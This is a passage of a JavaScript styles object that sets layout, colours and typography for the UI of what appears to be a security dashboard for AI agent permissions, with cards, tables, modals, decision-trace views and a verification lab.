    alignItems: 'center',
    flexWrap: 'wrap',
  },
  emptyEnvironmentCallout: {
    background: 'var(--surface-raised)',
    border: '1px dashed var(--border)',
    borderRadius: 'var(--radius-sm)',
    padding: '12px 16px',
    marginBottom: 16,
  },

  // Two Col Layout
  twoColRow: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(460px, 1fr))',
    gap: 14,
  },
  cardPanel: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: 16,
  },
  panelTitleRow: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    marginBottom: 12,
    gap: 10,
  },
  panelHeading: {
    fontSize: 13.5,
    fontWeight: 700,
    color: 'var(--text-primary)',
  },
  panelSub: {
    fontSize: 11,
    color: 'var(--text-dim)',
    marginTop: 2,
  },
  smallOutlineBtn: {
    background: 'none',
    border: '1px solid var(--border)',
    color: 'var(--signal)',
    fontSize: 11,
    fontWeight: 600,
    padding: '4px 8px',
    borderRadius: 4,
    cursor: 'pointer',
    whiteSpace: 'nowrap',
  },

  // Controls Bar
  viewControlsBar: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    gap: 12,
    flexWrap: 'wrap',
    marginBottom: 14,
  },
  searchInput: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontSize: 12,
    padding: '6px 10px',
    borderRadius: 'var(--radius-sm)',
    width: 220,
  },
  roleFilterGroup: {
    display: 'flex',
    gap: 4,
  },
  filterChip: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    color: 'var(--text-muted)',
    fontSize: 10.5,
    fontWeight: 600,
    padding: '4px 8px',
    borderRadius: 4,
    cursor: 'pointer',
  },
  filterChipActive: {
    background: 'var(--surface-raised)',
    borderColor: 'var(--signal)',
    color: 'var(--signal)',
  },
  primaryActionBtn: {
    background: 'var(--signal)',
    border: 'none',
    color: '#04211D',
    fontSize: 12,
    fontWeight: 700,
    padding: '6px 14px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
    whiteSpace: 'nowrap',
  },
  refreshBtn: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    color: 'var(--text-muted)',
    fontSize: 11.5,
    padding: '5px 10px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
  },

  // Tables
  tableWrap: {
    overflowX: 'auto',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    background: 'var(--surface)',
  },
  tableWrapCompact: {
    overflowX: 'auto',
  },
  table: {
    width: '100%',
    borderCollapse: 'collapse',
    textAlign: 'left',
  },
  th: {
    padding: '10px 12px',
    fontSize: 10.5,
    fontWeight: 700,
    letterSpacing: '0.04em',
    color: 'var(--text-dim)',
    borderBottom: '1px solid var(--border)',
    background: 'var(--surface-raised)',
  },
  tr: {
    borderBottom: '1px solid var(--border-soft, #1e2631)',
  },
  td: {
    padding: '10px 12px',
    fontSize: 12,
    color: 'var(--text-primary)',
    verticalAlign: 'middle',
  },
  tdCenter: {
    padding: '24px 12px',
    fontSize: 12.5,
    color: 'var(--text-muted)',
    textAlign: 'center',
  },
  mono: {
    fontFamily: 'var(--font-mono)',
  },
  monoValue: {
    fontFamily: 'var(--font-mono)',
    fontSize: 11.5,
    color: 'var(--text-primary)',
  },

  // Empty State Box
  emptyStateBox: {
    background: 'var(--surface)',
    border: '1px dashed var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: '40px 20px',
    textAlign: 'center',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    gap: 8,
  },
  emptyStateIcon: {
    fontSize: 28,
    marginBottom: 4,
  },
  emptyStateTitle: {
    fontSize: 14,
    fontWeight: 800,
    color: 'var(--text-primary)',
    letterSpacing: '0.03em',
  },
  emptyStateSub: {
    fontSize: 12,
    color: 'var(--text-muted)',
    maxWidth: 480,
    lineHeight: 1.5,
    marginBottom: 8,
  },

  // Principals Grid
  principalsGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))',
    gap: 14,
  },
  principalCard: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: 16,
    cursor: 'pointer',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'space-between',
    minHeight: 170,
  },
  principalCardBaseline: {
    borderColor: 'rgba(255, 92, 92, 0.3)',
  },
  principalCardHeader: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    marginBottom: 8,
  },
  principalName: {
    fontSize: 14,
    fontWeight: 700,
    color: 'var(--text-primary)',
  },
  principalIdMono: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10.5,
    color: 'var(--text-dim)',
    marginTop: 2,
  },
  principalDesc: {
    fontSize: 12,
    color: 'var(--text-muted)',
    lineHeight: 1.4,
    marginBottom: 10,
  },
  exposureSummaryBox: {
    background: 'var(--surface-raised)',
    borderRadius: 'var(--radius-sm)',
    padding: 10,
    display: 'flex',
    flexDirection: 'column',
    gap: 4,
    marginBottom: 10,
  },
  exposureRow: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    fontSize: 11,
  },
  exposureLabel: {
    fontWeight: 700,
    color: 'var(--text-dim)',
    fontSize: 9.5,
    letterSpacing: '0.04em',
  },
  exposureVal: {
    fontWeight: 600,
    color: 'var(--text-primary)',
  },
  principalCardFooter: {
    borderTop: '1px solid var(--border-soft, #1e2631)',
    paddingTop: 8,
  },
  inspectProfileLink: {
    fontSize: 11.5,
    fontWeight: 600,
    color: 'var(--signal)',
  },

  // Principal Profile
  profileHeaderNav: {
    display: 'flex',
    alignItems: 'center',
    gap: 14,
    marginBottom: 16,
  },
  backBtn: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontSize: 12,
    fontWeight: 600,
    padding: '6px 12px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
  },
  profileNavTitle: {
    fontSize: 13,
    color: 'var(--text-muted)',
  },
  profileNavAgentName: {
    fontSize: 13,
    fontWeight: 700,
    color: 'var(--signal)',
  },
  profileHeroCard: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: 18,
    marginBottom: 16,
  },
  profileHeroTop: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    flexWrap: 'wrap',
    gap: 14,
    marginBottom: 14,
  },
  profileHeroName: {
    fontSize: 18,
    fontWeight: 800,
    margin: 0,
    color: 'var(--text-primary)',
  },
  profileHeroMono: {
    fontFamily: 'var(--font-mono)',
    fontSize: 11,
    color: 'var(--text-dim)',
    marginTop: 4,
  },
  profileHeroDesc: {
    fontSize: 12.5,
    color: 'var(--text-muted)',
    marginTop: 4,
  },
  heroConsoleBtn: {
    background: 'var(--signal-dim)',
    border: '1px solid var(--signal)',
    color: 'var(--signal)',
    fontSize: 12,
    fontWeight: 700,
    padding: '6px 12px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
  },
  factualExposureStrip: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(160px, 1fr))',
    gap: 12,
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-sm)',
    padding: 10,
  },
  exposureStripCell: {},
  exposureStripLabel: {
    fontSize: 9.5,
    fontWeight: 700,
    color: 'var(--text-dim)',
    letterSpacing: '0.04em',
  },
  exposureStripVal: {
    fontSize: 13,
    fontWeight: 700,
    color: 'var(--text-primary)',
    marginTop: 2,
  },

  // Badges
  badge: {
    display: 'inline-flex',
    alignItems: 'center',
    gap: 6,
    padding: '3px 8px',
    borderRadius: 4,
    fontSize: 11,
    fontWeight: 700,
    fontFamily: 'var(--font-mono)',
  },
  badgeDot: {
    width: 6,
    height: 6,
    borderRadius: '50%',
  },
  smallBadge: {
    display: 'inline-block',
    padding: '2px 6px',
    borderRadius: 3,
    fontSize: 10,
    fontWeight: 700,
  },

  // Actions & Buttons
  allowToggleBtn: {
    background: 'rgba(74, 222, 128, 0.1)',
    border: '1px solid rgba(74, 222, 128, 0.35)',
    color: 'var(--tier-safe)',
    fontSize: 11,
    fontWeight: 600,
    padding: '3px 8px',
    borderRadius: 4,
    cursor: 'pointer',
  },
  denyToggleBtn: {
    background: 'rgba(255, 92, 92, 0.1)',
    border: '1px solid rgba(255, 92, 92, 0.35)',
    color: 'var(--tier-high)',
    fontSize: 11,
    fontWeight: 600,
    padding: '3px 8px',
    borderRadius: 4,
    cursor: 'pointer',
  },
  enabledToggle: {
    background: 'rgba(74, 222, 128, 0.1)',
    border: '1px solid rgba(74, 222, 128, 0.35)',
    color: 'var(--tier-safe)',
    fontSize: 11,
    fontWeight: 600,
    padding: '3px 8px',
    borderRadius: 4,
    cursor: 'pointer',
  },
  disabledToggle: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-dim)',
    fontSize: 11,
    fontWeight: 600,
    padding: '3px 8px',
    borderRadius: 4,
    cursor: 'pointer',
  },
  traceBtn: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--signal)',
    fontSize: 11,
    fontWeight: 600,
    padding: '3px 8px',
    borderRadius: 4,
    cursor: 'pointer',
  },
  tinySaveBtn: {
    background: 'var(--signal)',
    border: 'none',
    color: '#04211D',
    fontSize: 10.5,
    fontWeight: 700,
    padding: '3px 6px',
    borderRadius: 3,
    cursor: 'pointer',
  },
  tinyCancelBtn: {
    background: 'none',
    border: 'none',
    color: 'var(--text-dim)',
    fontSize: 11,
    cursor: 'pointer',
  },
  editGhostBtn: {
    background: 'none',
    border: 'none',
    color: 'var(--text-dim)',
    fontSize: 11,
    cursor: 'pointer',
    padding: 2,
  },
  testGhostBtn: {
    background: 'var(--signal-dim)',
    border: '1px solid rgba(69, 217, 196, 0.3)',
    color: 'var(--signal)',
    fontSize: 10.5,
    fontWeight: 600,
    padding: '2px 6px',
    borderRadius: 3,
    cursor: 'pointer',
  },
  linkBtn: {
    background: 'none',
    border: 'none',
    color: 'var(--signal)',
    fontSize: 11,
    cursor: 'pointer',
    textDecoration: 'underline',
  },

  // Modals & Inputs
  modalBackdrop: {
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    background: 'rgba(0, 0, 0, 0.75)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    zIndex: 1000,
    padding: 20,
  },
  modalBox: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-lg)',
    padding: 20,
    width: '100%',
    maxWidth: 500,
    maxHeight: '90vh',
    overflowY: 'auto',
  },
  modalHeader: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    marginBottom: 14,
  },
  modalTitle: {
    fontSize: 15,
    fontWeight: 700,
    color: 'var(--text-primary)',
  },
  modalCloseBtn: {
    background: 'none',
    border: 'none',
    color: 'var(--text-dim)',
    fontSize: 16,
    cursor: 'pointer',
  },
  modalForm: {
    display: 'flex',
    flexDirection: 'column',
    gap: 12,
  },
  formGroup: {
    display: 'flex',
    flexDirection: 'column',
    gap: 4,
  },
  formRow: {
    display: 'flex',
    gap: 10,
  },
  formLabel: {
    fontSize: 11,
    fontWeight: 600,
    color: 'var(--text-muted)',
  },
  input: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontSize: 12,
    padding: '6px 10px',
    borderRadius: 'var(--radius-sm)',
  },
  select: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontSize: 12,
    padding: '6px 10px',
    borderRadius: 'var(--radius-sm)',
  },
  selectSmall: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontSize: 11.5,
    padding: '4px 8px',
    borderRadius: 'var(--radius-sm)',
  },
  staticFieldMono: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--signal)',
    fontFamily: 'var(--font-mono)',
    fontSize: 12,
    padding: '6px 10px',
    borderRadius: 'var(--radius-sm)',
  },
  textareaMono: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontFamily: 'var(--font-mono)',
    fontSize: 11.5,
    padding: '8px 10px',
    borderRadius: 'var(--radius-sm)',
    resize: 'vertical',
  },
  modalFooter: {
    display: 'flex',
    justifyContent: 'flex-end',
    gap: 8,
    marginTop: 8,
  },
  cancelBtn: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-muted)',
    fontSize: 11.5,
    padding: '6px 12px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
  },

  // Security Test Buttons in Modal
  securityTestSection: {
    background: 'var(--surface-raised)',
    border: '1px dashed var(--border)',
    borderRadius: 'var(--radius-sm)',
    padding: 10,
    marginTop: 6,
  },
  secTestTitle: {
    fontSize: 9.5,
    fontWeight: 800,
    color: 'var(--text-dim)',
    letterSpacing: '0.04em',
    marginBottom: 6,
  },
  secTestRow: {
    display: 'flex',
    gap: 6,
    flexWrap: 'wrap',
  },
  secTestBtn: {
    background: 'rgba(255, 92, 92, 0.12)',
    border: '1px solid rgba(255, 92, 92, 0.35)',
    color: 'var(--tier-high)',
    fontSize: 10.5,
    fontWeight: 700,
    padding: '4px 8px',
    borderRadius: 3,
    cursor: 'pointer',
  },
  secTestBtnOutline: {
    background: 'none',
    border: '1px solid var(--border)',
    color: 'var(--signal)',
    fontSize: 10.5,
    fontWeight: 600,
    padding: '4px 8px',
    borderRadius: 3,
    cursor: 'pointer',
  },

  // Invariants
  conditionMono: {
    margin: 0,
    fontSize: 10.5,
    fontFamily: 'var(--font-mono)',
    color: 'var(--text-dim)',
    background: 'var(--surface-raised)',
    padding: '4px 6px',
    borderRadius: 3,
    maxWidth: 260,
    maxHeight: 70,
    overflowY: 'auto',
  },

  // Decision Trace Screen
  traceContainer: {
    display: 'flex',
    flexDirection: 'column',
    gap: 14,
  },
  traceSelectorRow: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: '10px 14px',
    flexWrap: 'wrap',
    gap: 10,
  },
  traceHeroCard: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: 16,
    display: 'flex',
    flexDirection: 'column',
    gap: 14,
  },
  traceSectionHeading: {
    fontSize: 11,
    fontWeight: 800,
    letterSpacing: '0.04em',
    color: 'var(--text-dim)',
  },
  traceMetaGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))',
    gap: 10,
    background: 'var(--surface-raised)',
    padding: 10,
    borderRadius: 'var(--radius-sm)',
  },
  metaLabel: {
    fontSize: 9.5,
    fontWeight: 700,
    color: 'var(--text-dim)',
  },
  metaValue: {
    fontSize: 12,
    fontWeight: 600,
    color: 'var(--text-primary)',
    marginTop: 2,
  },
  traceStagesContainer: {
    display: 'flex',
    flexDirection: 'column',
    gap: 10,
  },
  traceStageItem: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderLeftWidth: 4,
    borderRadius: 'var(--radius-sm)',
    padding: '10px 14px',
  },
  stageTopRow: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 4,
  },
  stageTitle: {
    fontSize: 12,
    fontWeight: 700,
    color: 'var(--text-primary)',
  },
  stageStatusPass: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10,
    fontWeight: 700,
    color: 'var(--tier-safe)',
    background: 'rgba(74, 222, 128, 0.12)',
    padding: '2px 6px',
    borderRadius: 3,
  },
  stageStatusBlock: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10,
    fontWeight: 700,
    color: 'var(--tier-high)',
    background: 'rgba(255, 92, 92, 0.12)',
    padding: '2px 6px',
    borderRadius: 3,
  },
  stageStatusApproval: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10,
    fontWeight: 700,
    color: 'var(--tier-medium)',
    background: 'rgba(245, 185, 66, 0.12)',
    padding: '2px 6px',
    borderRadius: 3,
  },
  stageDetails: {
    fontSize: 11.5,
    color: 'var(--text-muted)',
    marginTop: 2,
  },
  traceJsonPre: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-sm)',
    padding: '8px 10px',
    fontSize: 11,
    fontFamily: 'var(--font-mono)',
    color: 'var(--signal)',
    margin: '6px 0 0 0',
    maxHeight: 140,
    overflowY: 'auto',
  },

  // Verification Lab
  labContainer: {
    display: 'flex',
    flexDirection: 'column',
    gap: 12,
  },
  labDemarcationBanner: {
    background: 'rgba(245, 185, 66, 0.08)',
    border: '1px dashed rgba(245, 185, 66, 0.35)',
    borderRadius: 'var(--radius-md)',
    padding: '12px 16px',
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    flexWrap: 'wrap',
    gap: 10,
  },
  labDemarcationTitle: {
    fontSize: 12,
    fontWeight: 800,
    color: '#facc15',
    letterSpacing: '0.04em',
  },
  labDemarcationSub: {
    fontSize: 11,
    color: 'var(--text-muted)',
    marginTop: 2,
  },
  connectedAppWarning: {
    fontSize: 11,
    fontWeight: 700,
    color: '#f87171',
    background: 'rgba(255, 92, 92, 0.12)',
    padding: '4px 8px',
    borderRadius: 4,
  },
  scenarioBar: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: '10px 14px',
    display: 'flex',
    alignItems: 'center',
    gap: 8,
    flexWrap: 'wrap',
  },
  scenarioHeading: {
    fontSize: 11,
    fontWeight: 700,
    color: 'var(--text-dim)',
  },
  scenarioBtn: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontSize: 11,
    fontWeight: 600,
    padding: '4px 8px',
    borderRadius: 4,
    cursor: 'pointer',
  },
  labGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(420px, 1fr))',
    gap: 14,
  },
  labInputBox: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: 16,
    display: 'flex',
    flexDirection: 'column',
    gap: 12,
  },
  labBoxTitle: {
    fontSize: 13,
    fontWeight: 700,
    color: 'var(--text-primary)',
  },
  executeInterceptBtn: {
    background: 'var(--signal)',
    border: 'none',
    color: '#04211D',
    fontWeight: 800,
    fontSize: 12.5,
    padding: '10px 16px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
    textAlign: 'center',
    letterSpacing: '0.02em',
  },
  labTraceBox: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: 16,
    display: 'flex',
    flexDirection: 'column',
    gap: 12,
  },
  tracePlaceholder: {
    padding: '60px 20px',
    textAlign: 'center',
    color: 'var(--text-dim)',
    fontSize: 12.5,
    background: 'var(--surface-raised)',
    borderRadius: 'var(--radius-sm)',
    border: '1px dashed var(--border)',
    lineHeight: 1.5,
  },
  decisionBanner: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-sm)',
    padding: '12px 14px',
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    flexWrap: 'wrap',
    gap: 10,
  },
  decisionTitle: {
    fontSize: 12.5,
    color: 'var(--text-primary)',
  },
  decisionReasonMono: {
    fontFamily: 'var(--font-mono)',
    fontSize: 11,
    color: 'var(--text-muted)',
    marginTop: 2,
  },
  latencyValue: {
    fontFamily: 'var(--font-mono)',
    fontSize: 13,
    fontWeight: 700,
    color: 'var(--text-primary)',
  },
  callIdMono: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10,
    color: 'var(--text-dim)',
  },
}
